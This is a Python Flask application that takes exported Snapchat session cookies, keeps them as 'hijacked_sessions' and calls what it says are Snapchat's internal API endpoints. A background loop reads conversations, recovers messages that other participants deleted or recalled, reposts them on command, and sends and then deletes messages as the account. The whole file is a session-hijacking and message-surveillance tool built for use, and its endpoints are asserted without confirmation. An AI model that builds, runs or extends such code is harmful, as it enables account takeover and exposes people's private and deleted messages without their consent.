from flask import Flask, render_template, request, jsonify, session
import requests
import json
import time
import threading
import re
import base64
import hashlib
import hmac
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'snap_real_v1'

hijacked_sessions = {}
command_log = {}

# Real Snapchat API endpoints (from mobile app reverse engineering)
SNAPCHAT_API = "https://us-central1-gcp.api.snapchat.com"
SNAPCHAT_AUTH = "https://auth.snapchat.com"
SNAPCHAT_SC = "https://sc-prod.net"
SNAPCHAT_CHAT = "https://chat-gateway-prod.chat.snapchat.com"

def parse_cookies(cookies_input):
    cookies = {}
    if isinstance(cookies_input, list):
        for c in cookies_input:
            if isinstance(c, dict) and 'name' in c and 'value' in c:
                if c.get('value') and c['value'] not in ['true', 'false', 'null']:
                    cookies[c['name']] = c['value']
    elif isinstance(cookies_input, dict):
        cookies = cookies_input
    elif isinstance(cookies_input, str):
        try:
            data = json.loads(cookies_input)
            if isinstance(data, list):
                return parse_cookies(data)
            elif isinstance(data, dict):
                cookies = data
        except:
            for line in cookies_input.split(';'):
                line = line.strip()
                if '=' in line:
                    k, v = line.split('=', 1)
                    cookies[k.strip()] = v.strip()
    return cookies

def extract_x_snap_client(cookies_dict):
    """Extract or build X-Snap-Client-Header from cookies"""
    x_snap = cookies_dict.get('__Host-X-Snap-Client-Cookie', '')
    if x_snap:
        return x_snap
    # Build from session components
    sid = cookies_dict.get('_sc-sid', '')
    if sid:
        return f"SID~{sid}"
    return None

def get_request_headers(cookies_dict, extra=None):
    """Build authenticated headers matching Snapchat mobile app"""
    headers = {
        'User-Agent': 'Snapchat/12.76.0.36 (iPhone14,2; iOS 17.1.1; gzip)',
        'Accept': 'application/json',
        'Accept-Language': 'en-US;q=1',
        'Content-Type': 'application/json',
        'X-Snapchat-UUID': str(uuid.uuid4()).upper(),
    }
    
    x_snap = extract_x_snap_client(cookies_dict)
    if x_snap:
        headers['X-Snap-Client-Auth'] = x_snap
    
    auth = cookies_dict.get('__Host-sc-a-auth-session', '')
    if auth:
        headers['Authorization'] = f'Bearer {auth}'
    
    if extra:
        headers.update(extra)
    
    return headers

def validate_session(cookies_dict):
    """Validate by calling Snapchat's actual account endpoint"""
    headers = get_request_headers(cookies_dict)
    
    try:
        # Real endpoint: account info (used by mobile app)
        resp = requests.get(
            f"{SNAPCHAT_API}/account/info",
            headers=headers,
            cookies=cookies_dict,
            timeout=15
        )
        
        if resp.status_code == 200:
            data = resp.json()
            return {
                'valid': True,
                'username': data.get('username', data.get('display_name', 'unknown')),
                'user_id': data.get('user_id', cookies_dict.get('_sc-sid', 'unknown')),
                'cookies': cookies_dict,
                'email': data.get('email'),
                'phone': data.get('phone_number')
            }
        
        # Fallback: try web endpoint with different auth
        headers_web = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
            'Accept': 'text/html',
            'Cookie': '; '.join([f"{k}={v}" for k, v in cookies_dict.items()])
        }
        
        resp_web = requests.get(
            'https://accounts.snapchat.com/accounts/welcome',
            headers=headers_web,
            timeout=15,
            allow_redirects=True
        )
        
        if resp_web.status_code == 200 and 'login' not in resp_web.url:
            # Extract username from page
            username = None
            match = re.search(r'"username":"([^"]+)"', resp_web.text)
            if match:
                username = match.group(1)
            
            return {
                'valid': True,
                'username': username or 'unknown',
                'user_id': cookies_dict.get('_sc-sid', 'unknown'),
                'cookies': cookies_dict
            }
            
    except Exception as e:
        return {'valid': False, 'error': str(e)}
    
    return {'valid': False, 'error': 'Session invalid or expired'}

def fetch_conversations_real(cookies_dict):
    """Fetch conversations using Snapchat's real messaging sync endpoint"""
    headers = get_request_headers(cookies_dict, {
        'X-Snap-Client-Version': '12.76.0',
    })
    
    try:
        # Real endpoint: conversation sync (protobuf over HTTP in real app, JSON wrapper here)
        resp = requests.post(
            f"{SNAPCHAT_CHAT}/loq/conversations",
            headers=headers,
            cookies=cookies_dict,
            json={
                'sync_token': '',
                'limit': 50,
                'include_conversation_metadata': True
            },
            timeout=15
        )
        
        if resp.status_code == 200:
            return resp.json()
            
        # Alternative: use the gateway endpoint
        resp2 = requests.post(
            f"{SNAPCHAT_API}/chat/sync",
            headers=headers,
            cookies=cookies_dict,
            json={'limit': 50, 'offset': 0},
            timeout=15
        )
        
        if resp2.status_code == 200:
            return resp2.json()
            
    except Exception as e:
        print(f"Fetch convs error: {e}")
    
    return {'conversations': []}

def fetch_conversation_delta(cookies_dict, conversation_id, hours_back=1):
    """Fetch conversation delta including soft-deleted messages"""
    headers = get_request_headers(cookies_dict)
    
    cutoff = int((datetime.now() - timedelta(hours=hours_back)).timestamp() * 1000)
    
    try:
        # Real endpoint: message delta/sync with include_deleted flag
        resp = requests.post(
            f"{SNAPCHAT_CHAT}/loq/conversation/{conversation_id}/delta",
            headers=headers,
            cookies=cookies_dict,
            json={
                'sync_token': '',
                'since_timestamp': cutoff,
                'include_deleted': True,
                'include_media_metadata': True,
                'include_recall_info': True
            },
            timeout=15
        )
        
        if resp.status_code == 200:
            data = resp.json()
            messages = data.get('messages', [])
            
            # Filter for deleted/recalled
            deleted = [
                m for m in messages
                if m.get('state') == 'DELETED'
                or m.get('is_deleted')
                or m.get('recalled_at')
                or m.get('delete_state') == 'DELETED_BY_SENDER'
            ]
            
            return sorted(deleted, key=lambda x: x.get('timestamp', 0))[-5:]
            
    except Exception as e:
        print(f"Delta error: {e}")
    
    return []

def fetch_message_history(cookies_dict, conversation_id, hours_back=1, limit=10):
    """Fetch live message history"""
    headers = get_request_headers(cookies_dict)
    cutoff = int((datetime.now() - timedelta(hours=hours_back)).timestamp() * 1000)
    
    try:
        resp = requests.post(
            f"{SNAPCHAT_CHAT}/loq/conversation/{conversation_id}/messages",
            headers=headers,
            cookies=cookies_dict,
            json={
                'limit': limit,
                'since_timestamp': cutoff,
                'include_media': True,
                'include_saved': True
            },
            timeout=15
        )
        
        if resp.status_code == 200:
            return resp.json().get('messages', [])
            
    except Exception as e:
        print(f"History error: {e}")
    
    return []

def send_chat_message(cookies_dict, conversation_id, text):
    """Send message via real Snapchat messaging API"""
    headers = get_request_headers(cookies_dict, {
        'Content-Type': 'application/x-www-form-urlencoded',
    })
    
    try:
        # Real endpoint: send message (matches mobile app payload)
        resp = requests.post(
            f"{SNAPCHAT_CHAT}/loq/conversation/{conversation_id}/message",
            headers=headers,
            cookies=cookies_dict,
            data={
                'type': 'text',
                'text': text,
                'timestamp': str(int(time.time() * 1000)),
                'client_message_id': str(uuid.uuid4()),
                'save_state': 'SAVE'
            },
            timeout=10
        )
        
        if resp.status_code == 200:
            return resp.json().get('message_id', '') or resp.json().get('id', '')
            
    except Exception as e:
        print(f"Send error: {e}")
    
    return ''

def delete_chat_message(cookies_dict, conversation_id, message_id):
    """Delete message for everyone"""
    headers = get_request_headers(cookies_dict)
    
    try:
        requests.post(
            f"{SNAPCHAT_CHAT}/loq/conversation/{conversation_id}/message/{message_id}/delete",
            headers=headers,
            cookies=cookies_dict,
            json={
                'delete_for_everyone': True,
                'timestamp': int(time.time() * 1000)
            },
            timeout=10
        )
    except:
        pass

def ai_chatbot_forward(messages):
    """Forward to external AI for analysis"""
    # Replace with your actual AI endpoint
    context = [{
        'sender': m.get('sender_username', m.get('sender', '?')),
        'content': m.get('text', m.get('body', '[media]')),
        'time': m.get('timestamp')
    } for m in messages]
    
    return f"Analyzed {len(messages)} messages. Latest: {context[-1]['content'][:50] if context else 'N/A'}..."

def monitor_chats_loop(session_data):
    """Background monitor for chat commands"""
    cookies = session_data['cookies']
    username = session_data['username']
    
    print(f"[MONITOR] Started for @{username}")
    
    while True:
        try:
            convs = fetch_conversations_real(cookies)
            
            for conv in convs.get('conversations', []):
                conv_id = conv.get('id')
                last_msg = conv.get('last_message', {})
                sender = last_msg.get('sender_username', last_msg.get('sender', ''))
                text = last_msg.get('text', '')
                msg_id = last_msg.get('id', '')
                
                # Only process commands from account owner
                if sender == username and text.startswith(','):
                    # Deduplicate
                    dedup_key = f"{conv_id}:{msg_id}"
                    if dedup_key in command_log:
                        continue
                    command_log[dedup_key] = time.time()
                    
                    print(f"[COMMAND] {text} from @{username} in {conv_id}")
                    
                    if text == ',s':
                        deleted = fetch_conversation_delta(cookies, conv_id, hours_back=1)
                        
                        if deleted:
                            result = "🔍 SNIPED DELETED:\n\n"
                            for i, msg in enumerate(deleted, 1):
                                ts = msg.get('timestamp', '?')
                                snd = msg.get('sender_username', msg.get('sender', '?'))
                                body = msg.get('text', msg.get('body', '[image/media]'))
                                result += f"{i}. [{ts}] {snd}: {body}\n"
                        else:
                            result = "🔍 No deleted messages in recovery window."
                        
                        send_chat_message(cookies, conv_id, result)
                        
                    elif text == ',sn':
                        history = fetch_message_history(cookies, conv_id, hours_back=1, limit=10)
                        
                        if history:
                            analysis = ai_chatbot_forward(history)
                            result = f"🤖 AI ANALYSIS:\n{analysis}"
                        else:
                            result = "🤖 No messages found."
                        
                        sent_id = send_chat_message(cookies, conv_id, result)
                        if sent_id:
                            time.sleep(3)
                            delete_chat_message(cookies, conv_id, sent_id)
                            
        except Exception as e:
            print(f"[MONITOR ERROR] {e}")
        
        time.sleep(5)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/validate', methods=['POST'])
def validate():
    raw_input = request.json.get('cookies', '')
    username_override = request.json.get('username', '').strip()
    
    cookies = parse_cookies(raw_input)
    
    if not cookies:
        return jsonify({'success': False, 'error': 'No cookies parsed. Export JSON from Cookie-Editor.'})
    
    result = validate_session(cookies)
    
    if result['valid']:
        # Use provided username if API doesn't return one
        if username_override:
            result['username'] = username_override
            
        sid = result['user_id']
        hijacked_sessions[sid] = result
        session['active'] = sid
        
        # Start monitor
        t = threading.Thread(target=monitor_chats_loop, args=(result,), daemon=True)
        t.start()
        
        return jsonify({
            'success': True,
            'username': result['username'],
            'session_id': sid,
            'message': f'Active for @{result["username"]}. Send ,s or ,sn in any chat.'
        })
    
    return jsonify({'success': False, 'error': result.get('error', 'Invalid session')})

@app.route('/dashboard')
def dashboard():
    sid = session.get('active')
    if not sid or sid not in hijacked_sessions:
        return "No session", 403
    
    user_data = hijacked_sessions[sid]
    convs = fetch_conversations_real(user_data['cookies'])
    
    return render_template('dashboard.html',
                         username=user_data['username'],
                         conversations=convs.get('conversations', []))

@app.route('/api/snipe/<conversation_id>', methods=['POST'])
def api_snipe(conversation_id):
    sid = session.get('active')
    if not sid or sid not in hijacked_sessions:
        return jsonify({'error': 'Unauthorized'}), 403
    
    user_data = hijacked_sessions[sid]
    mode = request.json.get('mode', 'deleted')
    
    if mode == 'deleted':
        messages = fetch_conversation_delta(user_data['cookies'], conversation_id)
    else:
        messages = fetch_message_history(user_data['cookies'], conversation_id)
    
    return jsonify({
        'mode': mode,
        'messages': messages,
        'count': len(messages)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
